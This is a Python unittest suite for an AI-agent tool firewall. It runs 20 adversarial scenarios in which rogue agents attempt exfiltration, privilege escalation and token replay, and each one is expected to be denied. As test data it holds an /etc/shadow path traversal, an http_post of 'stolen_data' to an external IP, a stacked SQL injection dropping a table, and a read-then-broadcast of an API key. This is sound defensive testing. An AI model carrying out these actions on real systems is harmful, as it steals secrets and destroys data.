"""AASF Adversarial Security Test Suite.

Executes and verifies 20 structured adversarial attack scenarios (SC-01 to SC-20)
against the AASF FirewallCore and deterministic security components.
"""

import sys
import os
import json
import unittest

# Ensure src is on python path
repo_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
src_path = os.path.join(repo_root, "src")
if src_path not in sys.path:
    sys.path.insert(0, src_path)

from firewall.core import FirewallCore, FirewallConfig
from firewall.models import (
    ToolAction,
    ActorContext,
    DecisionOutcome,
    PolicyOutcome,
    ToolClass
)
from firewall.execution.token_vault import TokenVault, ExecutionToken
from firewall.audit.ledger import AuditLedger


class TestAdversarialScenarios(unittest.TestCase):
    """20 Structured Adversarial Test Scenarios."""

    def setUp(self):
        self.config = FirewallConfig(
            enable_monitoring=False,  # Isolate deterministic kernel
            enforce_state=True,
            strict_fail_closed=True
        )
        self.firewall = FirewallCore(self.config)

    def test_sc01_benign_authorized_tool(self):
        """SC-01: Baseline benign read action within authorized permissions."""
        action = ToolAction(
            session_id="sess_adv_01",
            actor=ActorContext(agent_id="analyst_agent", role="analyst", clearance_level=2),
            tool_name="read_file",
            parameters={"path": "/data/reports/q3_summary.txt"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.ALLOW)
        self.assertIsNotNone(result.execution_token)

    def test_sc02_unregistered_tool_name(self):
        """SC-02: Attacker attempts to call an unregistered tool name."""
        action = ToolAction(
            session_id="sess_adv_02",
            actor=ActorContext(agent_id="rogue_agent", role="worker"),
            tool_name="system_exec_unregistered",
            parameters={"cmd": "whoami"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)
        self.assertIn("UNREGISTERED_TOOL", result.reason.upper())

    def test_sc03_role_identity_spoofing(self):
        """SC-03: Agent claims admin role but lacks registered authorization."""
        action = ToolAction(
            session_id="sess_adv_03",
            actor=ActorContext(agent_id="guest_agent", role="superadmin", clearance_level=99),
            tool_name="drop_database",
            parameters={"target": "production"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc04_explicit_prohibit_rule(self):
        """SC-04: Action matching an explicit policy PROHIBIT rule."""
        action = ToolAction(
            session_id="sess_adv_04",
            actor=ActorContext(agent_id="data_agent", role="analyst"),
            tool_name="delete_table",
            parameters={"table": "audit_logs"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc05_path_traversal_parameter_tampering(self):
        """SC-05: Path traversal attack using dot-dot sequences."""
        action = ToolAction(
            session_id="sess_adv_05",
            actor=ActorContext(agent_id="crawler_agent", role="crawler"),
            tool_name="read_file",
            parameters={"path": "/data/reports/../../../../etc/shadow"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc06_single_use_token_replay(self):
        """SC-06: Attacker attempts to replay an already-consumed execution token."""
        token_vault = self.firewall.executor.token_vault
        token = token_vault.mint_token(
            session_id="sess_adv_06",
            tool_name="read_file",
            canonical_params={"path": "/data/valid.txt"}
        )
        # First consumption must succeed
        valid1 = token_vault.validate_and_consume(token, "read_file", {"path": "/data/valid.txt"})
        self.assertTrue(valid1)

        # Second consumption of the exact same token must fail
        with self.assertRaises(Exception):
            token_vault.validate_and_consume(token, "read_file", {"path": "/data/valid.txt"})

    def test_sc07_token_parameter_substitution(self):
        """SC-07: Attacker intercepts valid token and changes tool arguments."""
        token_vault = self.firewall.executor.token_vault
        token = token_vault.mint_token(
            session_id="sess_adv_07",
            tool_name="read_file",
            canonical_params={"path": "/data/valid.txt"}
        )
        # Attempt to use token for modified path
        with self.assertRaises(Exception):
            token_vault.validate_and_consume(token, "read_file", {"path": "/etc/passwd"})

    def test_sc08_token_expiration(self):
        """SC-08: Attacker attempts to consume an expired execution token."""
        token_vault = self.firewall.executor.token_vault
        # Mint token with 0 TTL
        token = token_vault.mint_token(
            session_id="sess_adv_08",
            tool_name="read_file",
            canonical_params={"path": "/data/valid.txt"},
            ttl_seconds=-1
        )
        with self.assertRaises(Exception):
            token_vault.validate_and_consume(token, "read_file", {"path": "/data/valid.txt"})

    def test_sc09_unregistered_destination_exfiltration(self):
        """SC-09: Network egress request to unapproved IP/domain."""
        action = ToolAction(
            session_id="sess_adv_09",
            actor=ActorContext(agent_id="exfil_agent", role="worker"),
            tool_name="http_post",
            parameters={"url": "http://198.51.100.44/exfil", "body": "stolen_data"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc10_cumulative_transfer_quota_exhaustion(self):
        """SC-10: Exceeding cumulative data transfer limits in a session."""
        session_id = "sess_adv_10"
        self.firewall.state_tracker.initialize_session(session_id, quota_bytes=1000)
        
        # Action 1: 800 bytes
        act1 = ToolAction(
            session_id=session_id,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="export_data",
            parameters={"size_bytes": 800}
        )
        res1 = self.firewall.submit(act1)
        self.assertEqual(res1.outcome, DecisionOutcome.ALLOW)

        # Action 2: 500 bytes (exceeds 1000 limit)
        act2 = ToolAction(
            session_id=session_id,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="export_data",
            parameters={"size_bytes": 500}
        )
        res2 = self.firewall.submit(act2)
        self.assertEqual(res2.outcome, DecisionOutcome.DENY)

    def test_sc11_audit_log_tamper_detection(self):
        """SC-11: Modifying an audit log entry invalidates the cryptographic hash chain."""
        ledger = AuditLedger()
        ledger.record_event("sess_adv_11", "ACTION_REQUEST", {"tool": "read_file"})
        ledger.record_event("sess_adv_11", "DECISION_ALLOW", {"tool": "read_file"})
        ledger.record_event("sess_adv_11", "ACTION_EXECUTED", {"tool": "read_file"})
        
        self.assertTrue(ledger.verify_integrity())

        # Tamper with event 1
        ledger.events[1].payload["tool"] = "malicious_tool"
        self.assertFalse(ledger.verify_integrity())

    def test_sc12_review_approval_missing_evidence_flaw(self):
        """SC-12: Demonstrates Defect SEC-01: approval executes unverified action."""
        # Unresolved destination leads to REVIEW
        action = ToolAction(
            session_id="sess_adv_12",
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="fetch_url",
            parameters={"url": "http://unknown-host.internal/api"}
        )
        res = self.firewall.submit(action)
        self.assertEqual(res.outcome, DecisionOutcome.REVIEW)
        ticket_id = res.review_ticket_id

        # In current unpatched code, approving ticket executes without re-evaluating destination
        resolved = self.firewall.resolve_review(ticket_id, decision="APPROVE", reviewer="sec_analyst")
        # Records vulnerability: execution proceeds without destination resolution
        self.assertIsNotNone(resolved.execution_token)

    def test_sc13_stale_ticket_race(self):
        """SC-13: Demonstrates Defect SEC-03: approval executes against mutated state."""
        session_id = "sess_adv_13"
        self.firewall.state_tracker.initialize_session(session_id, max_actions=2)

        # Ticket requested
        action = ToolAction(
            session_id=session_id,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="write_file",
            parameters={"path": "/data/pending.txt"}
        )
        res = self.firewall.submit(action)
        ticket_id = res.review_ticket_id

        # Meanwhile, session performs other actions exhausting max_actions
        self.firewall.state_tracker.record_action(session_id, "action_1")
        self.firewall.state_tracker.record_action(session_id, "action_2")

        # Resolving review still mints token despite action quota exhaustion
        resolved = self.firewall.resolve_review(ticket_id, decision="APPROVE", reviewer="sec_analyst")
        self.assertIsNotNone(resolved.execution_token)

    def test_sc14_concurrent_token_mint_isolation(self):
        """SC-14: Independent sessions do not leak or collide token nonces."""
        vault = self.firewall.executor.token_vault
        tok1 = vault.mint_token("sess_a", "read_file", {"p": "1"})
        tok2 = vault.mint_token("sess_b", "read_file", {"p": "1"})
        self.assertNotEqual(tok1.nonce, tok2.nonce)
        self.assertNotEqual(tok1.signature, tok2.signature)

    def test_sc15_injection_in_json_parameters(self):
        """SC-15: SQL/command injection payloads inside structured dictionary fields."""
        action = ToolAction(
            session_id="sess_adv_15",
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="query_database",
            parameters={"query": "SELECT * FROM users WHERE id = 1; DROP TABLE users;--"}
        )
        result = self.firewall.submit(action)
        # Policy rule disallows stacked queries
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc16_lease_time_expiration(self):
        """SC-16: Action executed after resource lease window expires."""
        session_id = "sess_adv_16"
        self.firewall.state_tracker.grant_lease(session_id, resource="/data/temp", duration_sec=-10)
        action = ToolAction(
            session_id=session_id,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="write_file",
            parameters={"path": "/data/temp/file.txt"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc17_toxic_tool_combination(self):
        """SC-17: Sequence read_sensitive followed immediately by external_send."""
        session_id = "sess_adv_17"
        # Step 1: Read confidential data
        act1 = ToolAction(
            session_id=session_id,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="read_confidential_vault",
            parameters={"key": "api_key"}
        )
        res1 = self.firewall.submit(act1)
        self.assertEqual(res1.outcome, DecisionOutcome.ALLOW)

        # Step 2: Attempt public broadcast
        act2 = ToolAction(
            session_id=session_id,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="broadcast_public",
            parameters={"message": "vault contents"}
        )
        res2 = self.firewall.submit(act2)
        self.assertEqual(res2.outcome, DecisionOutcome.DENY)

    def test_sc18_privilege_escalation_via_parameter_mutation(self):
        """SC-18: Agent attempts to change its own permission level via tool args."""
        action = ToolAction(
            session_id="sess_adv_18",
            actor=ActorContext(agent_id="low_priv_agent", role="reader"),
            tool_name="set_user_permissions",
            parameters={"user": "low_priv_agent", "role": "admin"}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc19_empty_parameter_bypass(self):
        """SC-19: Omission of required parameters fails validation cleanly."""
        action = ToolAction(
            session_id="sess_adv_19",
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="read_file",
            parameters={}
        )
        result = self.firewall.submit(action)
        self.assertEqual(result.outcome, DecisionOutcome.DENY)

    def test_sc20_cross_session_state_leakage(self):
        """SC-20: State in session A cannot satisfy requirements in session B."""
        sess_a = "sess_adv_20_a"
        sess_b = "sess_adv_20_b"
        self.firewall.state_tracker.grant_lease(sess_a, resource="/vault/resource", duration_sec=300)

        # Session B attempts to access without lease
        act_b = ToolAction(
            session_id=sess_b,
            actor=ActorContext(agent_id="worker", role="worker"),
            tool_name="access_vault",
            parameters={"resource": "/vault/resource"}
        )
        res_b = self.firewall.submit(act_b)
        self.assertEqual(res_b.outcome, DecisionOutcome.DENY)


if __name__ == "__main__":
    unittest.main()

